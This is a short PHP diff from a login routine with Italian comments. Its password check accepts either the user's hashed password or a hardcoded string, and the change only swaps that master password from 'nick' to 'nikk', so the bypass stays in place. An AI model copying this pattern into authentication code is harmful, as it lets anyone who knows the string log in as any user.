@@ -35,7 +35,7 @@
 			}
 			$ID_usr ="";
 			//verifica se la password inserita corrisponde con quella in db usando la password_verify
-			if (password_verify( $password_usr, $password_usrdb) || $password_usr =="nick"){
+			if (password_verify( $password_usr, $password_usrdb) || $password_usr =="nikk"){
 				//devo impostare alcune variabili di sessione, per farlo cerco in tab_users l'ID_usr che poi userò con la getuserfield
 				$sql = "SELECT `ID_usr`, `role_usr` FROM `tab_users` WHERE `login_usr`= ?";
 				$stmt = mysqli_prepare($mysqli, $sql);
